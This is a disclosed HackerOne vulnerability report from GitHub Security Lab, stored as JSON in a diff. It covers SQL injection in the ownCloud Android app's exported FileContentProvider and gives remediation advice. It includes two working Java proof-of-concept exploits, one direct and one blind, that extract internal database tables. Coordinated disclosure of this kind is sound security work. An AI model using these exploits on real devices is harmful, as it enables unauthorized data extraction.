@@ -1,0 +1,138 @@
+{
+  "id": 1650264,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjUwMjY0",
+  "url": "https://hackerone.com/reports/1650264",
+  "title": "GitHub Security Lab (GHSL) Vulnerability Report: SQLInjection in FileContentProvider.kt (GHSL-2022-059)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-26T13:31:27.214Z",
+  "submitted_at": "2022-07-26T13:31:27.302Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "atorralba",
+    "url": "/atorralba",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jz9ee2cfuc3li9d3tml3dxnrhxh7/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3059,
+    "url": "https://hackerone.com/owncloud",
+    "handle": "owncloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "ownCloud",
+      "twitter_handle": "ownCloud",
+      "website": "https://www.owncloud.com",
+      "about": "ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-04-12T14:59:43.545Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-03-13T14:59:42.453Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [Owncloud Android app](https://github.com/owncloud/android).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2022-059` or `GHSL-2022-060` as a reference).\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nThe Owncloud Android app uses [content providers](https://developer.android.com/guide/topics/providers/content-provider-basics) to manage its data. The provider `FileContentProvider` has SQL injection vulnerabilities that allows malicious applications or users in the same device to obtain internal information of the app.\n\n## Details \n\nThe `FileContentProvider` provider is exported, as can be seen in the Android Manifest:\n\n[`AndroidManifest.xml:153`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/AndroidManifest.xml#L153)\n\n```xml\n<provider\n    android:name=\".providers.FileContentProvider\"\n    android:authorities=\"@string/authority\"\n    android:enabled=\"true\"\n    android:exported=\"true\"\n    android:label=\"@string/sync_string_files\"\n    android:syncable=\"true\" />\n```\nAll tables in this content provider can be freely interacted with by other apps in the same device. By reviewing the entry-points of the content provider for those tables, it can be seen that several parameters containing user input end up reaching an unsafe SQL method that allows for SQL injection.\n\n## The `delete` method\n\nUser input enters the content provider through the three parameters of this method:\n\n[`FileContentProvider.kt:85`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L85)\n```kt\noverride fun delete(uri: Uri, where: String?, whereArgs: Array<String>?): Int {\n```\n\nThe `where` parameter reaches the following dangerous arguments without sanitization:\n\n[`FileContentProvider.kt:102`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L102)\n\n```kt\nprivate fun delete(db: SQLiteDatabase, uri: Uri, where: String?, whereArgs: Array<String>?): Int {\n    // --snip--\n    when (uriMatcher.match(uri)) {\n        SINGLE_FILE -> {\n            // --snip--\n            count = db.delete(\n                ProviderTableMeta.FILE_TABLE_NAME,\n                ProviderTableMeta._ID +\n                        \"=\" +\n                        uri.pathSegments[1] +\n                        if (!TextUtils.isEmpty(where))\n                            \" AND ($where)\" // injection\n                        else\n                            \"\", whereArgs\n            )\n        }\n        DIRECTORY -> {\n            // --snip--\n            count += db.delete(\n                ProviderTableMeta.FILE_TABLE_NAME,\n                ProviderTableMeta._ID + \"=\" +\n                        uri.pathSegments[1] +\n                        if (!TextUtils.isEmpty(where))\n                            \" AND ($where)\" // injection\n                        else\n                            \"\", whereArgs\n            )\n        }\n        ROOT_DIRECTORY ->\n            count = db.delete(ProviderTableMeta.FILE_TABLE_NAME, where, whereArgs) // injection\n        SHARES -> count =\n            OwncloudDatabase.getDatabase(MainApp.appContext).shareDao().deleteShare(uri.pathSegments[1])\n        CAPABILITIES -> count = db.delete(ProviderTableMeta.CAPABILITIES_TABLE_NAME, where, whereArgs) // injection\n        UPLOADS -> count = db.delete(ProviderTableMeta.UPLOADS_TABLE_NAME, where, whereArgs) // injection\n        CAMERA_UPLOADS_SYNC -> count = db.delete(ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, where, whereArgs) // injection\n        QUOTAS -> count = db.delete(ProviderTableMeta.USER_QUOTAS_TABLE_NAME, where, whereArgs) // injection\n        // --snip--\n    }\n    // --snip--\n}\n```\n\n### The `insert` method\n\nUser input enters the content provider through the two parameters of this method:\n\n[`FileContentProvider.kt:183`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L183)\n\n```kt\noverride fun insert(uri: Uri, values: ContentValues?): Uri? {\n```\n\nThe `values` parameter reaches the following dangerous arguments without sanitization:\n\n[`FileContentProvider.kt:197`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L197)\n\n```kt\n private fun insert(db: SQLiteDatabase, uri: Uri, values: ContentValues?): Uri {\n    when (uriMatcher.match(uri)) {\n        ROOT_DIRECTORY, SINGLE_FILE -> {\n            // --snip--\n            return if (!doubleCheck.moveToFirst()) {\n                // --snip--\n                val fileId = db.insert(ProviderTableMeta.FILE_TABLE_NAME, null, values) // injection\n                // --snip--\n            } \n            // --snip--\n        }\n        // --snip--\n\n        CAPABILITIES -> {\n            val capabilityId = db.insert(ProviderTableMeta.CAPABILITIES_TABLE_NAME, null, values) // injection\n            // --snip--\n        }\n\n        UPLOADS -> {\n            val uploadId = db.insert(ProviderTableMeta.UPLOADS_TABLE_NAME, null, values) // injection\n            // --snip--\n        }\n\n        CAMERA_UPLOADS_SYNC -> {\n            val cameraUploadId = db.insert(\n                ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, null,\n                values // injection\n            )\n            // --snip--\n        }\n        QUOTAS -> {\n            val quotaId = db.insert(\n                ProviderTableMeta.USER_QUOTAS_TABLE_NAME, null,\n                values // injection\n            )\n            // --snip--\n        }\n        // --snip--\n    }\n}\n```\n\n### The `query` method\n\nUser input enters the content provider through the five parameters of this method:\n\n[`FileContentProvider.kt:304`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L304-L309)\n\n```kt\noverride fun query(\n    uri: Uri,\n    projection: Array<String>?,\n    selection: String?,\n    selectionArgs: Array<String>?,\n    sortOrder: String?\n): Cursor {\n```\n\nThe `selection` and `sortOrder` parameters reach the following dangerous arguments without sanitization (note that `projection` is safe because of the use of a projection map):\n\n[`FileContentProvider.kt:337`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L337-L354)\n\n```kt\nSHARES -> {\n    val supportSqlQuery = SupportSQLiteQueryBuilder\n        .builder(ProviderTableMeta.OCSHARES_TABLE_NAME)\n        .columns(computeProjection(projection))\n        .selection(selection, selectionArgs) // injection\n        .orderBy(\n            if (TextUtils.isEmpty(sortOrder)) {\n                sortOrder // injection\n            } else {\n                ProviderTableMeta.OCSHARES_DEFAULT_SORT_ORDER\n            }\n        ).create()\n\n    // To use full SQL queries within Room\n    val newDb: SupportSQLiteDatabase =\n        OwncloudDatabase.getDatabase(MainApp.appContext).openHelper.writableDatabase\n    return newDb.query(supportSqlQuery)\n}\n```\n\n[`FileContentProvider.kt:402`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L402)\n\n```kt\nval c = sqlQuery.query(db, projection, selection, selectionArgs, null, null, order)\n```\n\n### The `update` method\n\nUser input enters the content provider through the four parameters of this method:\n\n[`FileContentProvider.kt:458`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L444)\n\n```kt\noverride fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int {\n```\n\nThe `values` and `selection` parameters reach the following dangerous arguments without sanitization:\n\n[`FileContentProvider.kt:458`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L458-L486)\n\n```kt\nprivate fun update(\n        db: SQLiteDatabase,\n        uri: Uri,\n        values: ContentValues?,\n        selection: String?,\n        selectionArgs: Array<String>?\n): Int {\n    if (selection != null && selectionArgs == null) {\n        throw IllegalArgumentException(\"Selection not allowed, use parameterized queries\")\n    }\n    when (uriMatcher.match(uri)) {\n        DIRECTORY -> return 0 //updateFolderSize(db, selectionArgs[0]);\n        SHARES -> return values?.let {\n            OwncloudDatabase.getDatabase(context!!).shareDao()\n                .update(OCShareEntity.fromContentValues(it)).toInt()\n        } ?: 0\n        CAPABILITIES -> return db.update(ProviderTableMeta.CAPABILITIES_TABLE_NAME, values, selection, selectionArgs) // injection\n        UPLOADS -> {\n            val ret = db.update(ProviderTableMeta.UPLOADS_TABLE_NAME, values, selection, selectionArgs) // injection\n            trimSuccessfulUploads(db)\n            return ret\n        }\n        CAMERA_UPLOADS_SYNC -> return db.update(ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, values, selection, selectionArgs) // injection\n        QUOTAS -> return db.update(ProviderTableMeta.USER_QUOTAS_TABLE_NAME, values, selection, selectionArgs) // injection\n        else -> return db.update(\n            ProviderTableMeta.FILE_TABLE_NAME, values, selection, selectionArgs // injection\n        )\n    }\n}\n```\n## Remediation\n\nConsider these suggestions: https://developer.android.com/guide/topics/providers/content-provider-basics#Injection.\n\nIn general, any user input, including the parameters of the exposed methods of the `ContentProvider` interface, should be considered potentially malicious. As such, make sure that they are correctly validated and/or sanitized before using them in SQL statements or calls. This includes the keys in `ContentValues` objects, since those are used as column names in `insert` and `update` calls.\n\nAlso, if a content provider does not need to be exported, it is best to set its `exported` attribute to `false` so that other applications are not able to access it.\n\n## Resources\n\n### SQL injection in `filelist`\n\nThe following PoC demonstrates how a malicious application with no special permissions could extract information from any table in the `filelist` database exploiting the issues mentioned above:\n\n```java\npackage com.example.test;\n\nimport android.content.ContentValues;\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class OwncloudProviderExploit {\n\n    public static String exploit(Context ctx, String columnName, String tableName) throws Exception {\n        Uri result = ctx.getContentResolver().insert(Uri.parse(\"content://org.owncloud/file\"), newOwncloudFile());\n        ContentValues updateValues = new ContentValues();\n        updateValues.put(\"etag=?,path=(SELECT GROUP_CONCAT(\" + columnName + \",'\\n') \" +\n                \"FROM \" + tableName + \") \" +\n                \"WHERE _id=\" + result.getLastPathSegment() + \"-- -\", \"a\");\n        Log.e(\"test\", \"\" + ctx.getContentResolver().update(\n                result, updateValues, null, null));\n        String query = query(ctx, new String[]{\"path\"},\n                \"_id=?\", new String[]{result.getLastPathSegment()});\n        deleteFile(ctx, result.getLastPathSegment());\n        return query;\n    }\n\n    public static String query(Context ctx, String[] projection, String selection, String[] selectionArgs) throws Exception {\n        try (Cursor mCursor = ctx.getContentResolver().query(Uri.parse(\"content://org.owncloud/file\"),\n                projection,\n                selection,\n                selectionArgs,\n                null)) {\n            if (mCursor == null) {\n                Log.e(\"evil\", \"mCursor is null\");\n                return \"0\";\n            }\n            StringBuilder output = new StringBuilder();\n            while (mCursor.moveToNext()) {\n                for (int i = 0; i < mCursor.getColumnCount(); i++) {\n                    String column = mCursor.getColumnName(i);\n                    String value = mCursor.getString(i);\n                    output.append(\"|\").append(column).append(\":\").append(value);\n                }\n                output.append(\"\\n\");\n            }\n            return output.toString();\n        }\n    }\n\n    private static ContentValues newOwncloudFile() throws Exception {\n        ContentValues values = new ContentValues();\n        values.put(\"parent\", \"a\");\n        values.put(\"filename\", \"a\");\n        values.put(\"created\", \"a\");\n        values.put(\"modified\", \"a\");\n        values.put(\"modified_at_last_sync_for_data\", \"a\");\n        values.put(\"content_length\", \"a\");\n        values.put(\"content_type\", \"a\");\n        values.put(\"media_path\", \"a\");\n        values.put(\"path\", \"a\");\n        values.put(\"file_owner\", \"a\");\n        values.put(\"last_sync_date\", \"a\");\n        values.put(\"last_sync_date_for_data\", \"a\");\n        values.put(\"etag\", \"a\");\n        values.put(\"share_by_link\", \"a\");\n        values.put(\"shared_via_users\", \"a\");\n        values.put(\"permissions\", \"a\");\n        values.put(\"remote_id\", \"a\");\n        values.put(\"update_thumbnail\", \"a\");\n        values.put(\"is_downloading\", \"a\");\n        values.put(\"etag_in_conflict\", \"a\");\n        return values;\n    }\n\n    public static String deleteFile(Context ctx, String id) throws Exception {\n        ctx.getContentResolver().delete(\n                Uri.parse(\"content://org.owncloud/file/\" + id),\n                null,\n                null\n        );\n        return \"1\";\n    }\n}\n```\n\nBy providing a columnName and tableName to the exploit function, the attacker takes advantage of the issues explained above to:\n\n* Create a new file entry in `FileContentProvider`.\n* Exploit the SQL Injection in the `update` method to set the `path` of the recently created file to the values of `columnName` in the table `tableName`.\n* Query the `path` of the modified file entry to obtain the desired values.\n* Delete the file entry.\n\nFor instance, `exploit(context, \"name\", \"SQLITE_MASTER WHERE type=\"table\")` would return all the tables in the `filelist` database.\n\n### Blind SQL injection in `owncloud_database`\n\nThe following PoC demonstrates how a malicious application with no special permissions could extract information from any table in the `owncloud_database` database exploiting the issues mentioned above using a Blind SQL injection technique:\n\n```java\npackage com.example.test;\n\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.net.Uri;\nimport android.util.Log;\n\npublic class OwncloudProviderExploit {\n\n    public static String blindExploit(Context ctx) {\n        String output = \"\";\n        String chars = \"abcdefghijklmopqrstuvwxyz0123456789\";\n        while (true) {\n            int outputLength = output.length();\n            for (int i = 0; i < chars.length(); i++) {\n                char candidate = chars.charAt(i);\n                String attempt = String.format(\"%s%c%s\", output, candidate, \"%\");\n                try (Cursor mCursor = ctx.getContentResolver().query(\n                        Uri.parse(\"content://org.owncloud/shares\"),\n                        null,\n                        \"'a'=? AND (SELECT identity_hash FROM room_master_table) LIKE '\" + attempt + \"'\",\n                        new String[]{\"a\"}, null)) {\n                    if (mCursor == null) {\n                        Log.e(\"ProviderHelper\", \"mCursor is null\");\n                        return \"0\";\n                    }\n                    if (mCursor.getCount() > 0) {\n                        output += candidate;\n                        Log.i(\"evil\", output);\n                        break;\n                    }\n                }\n            }\n            if (output.length() == outputLength)\n                break;\n        }\n        return output;\n    }\n\n}\n```\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).\n\n## Credit\n\nThese issues were discovered and reported by the CodeQL team member [@atorralba (Tony Torralba)](https://github.com/atorralba).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-059` or `GHSL-2022-060` in any communication regarding these issues.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).\n\n## Impact\n\nThere are two databases affected by this vulnerability: `filelist` and `owncloud_database`.\n\nSince the tables in `filelist` are affected by the injections in the `insert` and `update` methods, an attacker can use those to insert a crafted row in any table of the database containing data queried from other tables. After that, the attacker only needs to query the crafted row to obtain the information (see the `Resources` section for a PoC). Despite that, currently all tables are legitimately exposed through the content provider itself, so the injections cannot be exploited to obtain any extra data. Nonetheless, if new tables were added in the future that were not accessible through the content provider, those could be accessed using these vulnerabilities.\n\nRegarding the tables in `owncloud_database`, there are two that are not accessible through the content provider: `room_master_table` and `folder_backup`. An attacker can exploit the vulnerability in the `query` method to exfiltrate data from those. Since the `strictMode` is enabled in the `query` method, the attacker needs to use a Blind SQL injection attack to succeed (see the `Resources` section for a PoC).\n\nIn both cases, the impact is information disclosure. Take into account that the tables exposed in the content provider (most of them) are arbitrarily modifiable by third party apps without exploiting any vulnerability, since the `FileContentProvider` is exported and does not require any permissions.",
+  "bounty_amount": "300.0",
+  "formatted_bounty": "$300",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-04-12T14:59:42.583Z",
+  "allow_singular_disclosure_after": -96429577.10539481,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "fr4via",
+    "zy9ard3",
+    "shreyaschavhan",
+    "polem4rch",
+    "eminfidan",
+    "robinx0xhood",
+    "shieldmaster",
+    "citizenk4ne",
+    "yahya-sayed",
+    "anonymousdoomer",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.2,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 469,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.owncloud.android",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
